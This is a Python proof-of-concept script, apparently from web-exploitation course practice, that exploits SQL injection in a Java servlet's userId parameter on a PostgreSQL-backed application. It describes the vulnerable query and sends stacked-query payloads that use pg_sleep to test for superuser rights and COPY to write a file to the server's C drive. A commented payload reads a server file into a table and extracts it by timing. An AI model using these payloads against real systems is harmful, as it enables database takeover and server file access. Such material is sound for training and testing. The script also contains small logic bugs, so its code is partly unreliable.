"""

Union + Time Based Blind Injection

Web App: JAVA
DB: psql
Vuln Url: https://192.168.189.113:8443/servlet/AMUserResourcesSyncServlet
Vuln Params: ForMasRange(str) userId(str)
Vuln Query Construction:
    String qry = 
    "select distinct(RESOURCEID)
    from AM_USERRESOURCESTABLE
    where USERID=" + userId + " and RESOURCEID >" + stRange + " and RESOURCEID < " + endRange;
Vuln Reason:
    USERID isn't sanitized or validated to reach before reaching this query construction.

PSQL allows for stacked queries so a time based sql injection works better here.

[!] Response from request is 200 with 0 content length regardless of query error or not.
    pg_sleep() inside a case statement will solve this issue

"""

import requests
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

url = "https://192.168.189.113:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=[inj_str]"

def create_tmp_table(t_name:str):
    inj_str = '1;copy+(select+$$hello$$)+to+$$c:\\offsec.txt$$;--+'

def main():
    # inj_str = '1;+select+case+when+(select+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(5)+end;--+'
    # create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+
    inj_str = '1;copy+(select+$$hello$$)+to+$$c:\\offsec.txt$$;--+' # If you can write to the C drive you most likely have admin priv
    

    response = requests.get(url.replace('[inj_str]', inj_str), verify=False)

    if status_code := response.status_code // 100 == 2:
        print('200')

    if elapsed_time := response.elapsed.total_seconds() > 4.0:
        print(elapsed_time)
    print('main')

main()